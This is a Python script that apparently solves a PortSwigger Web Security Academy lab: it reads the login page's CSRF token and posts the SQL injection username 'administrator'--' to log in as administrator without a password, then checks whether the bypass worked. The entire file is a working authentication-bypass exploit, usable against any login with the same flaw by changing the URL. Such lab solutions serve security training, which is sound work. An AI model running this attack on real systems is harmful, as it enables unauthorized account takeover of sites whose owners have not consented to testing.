#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

# Replace with your own PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0ab5006d039f724080322bd800e400e7.web-security-academy.net"

session = requests.Session()

print("[*] Retrieving login page...")

response = session.get(f"{LAB_URL}/login", timeout=10)

soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

print(f"[+] CSRF Token: {csrf}")

payload = {
    "csrf": csrf,
    "username": "administrator'--",
    "password": "anything"
}

print("\n[*] Attempting SQL injection login bypass...")

response = session.post(
    f"{LAB_URL}/login",
    data=payload,
    timeout=10,
)

print("=" * 50)
print(f"Status : {response.status_code}")
print(f"Length : {len(response.text)}")

if "Log out" in response.text:
    print("[+] Successfully logged in as administrator!")
else:
    print("[-] Login bypass failed.")
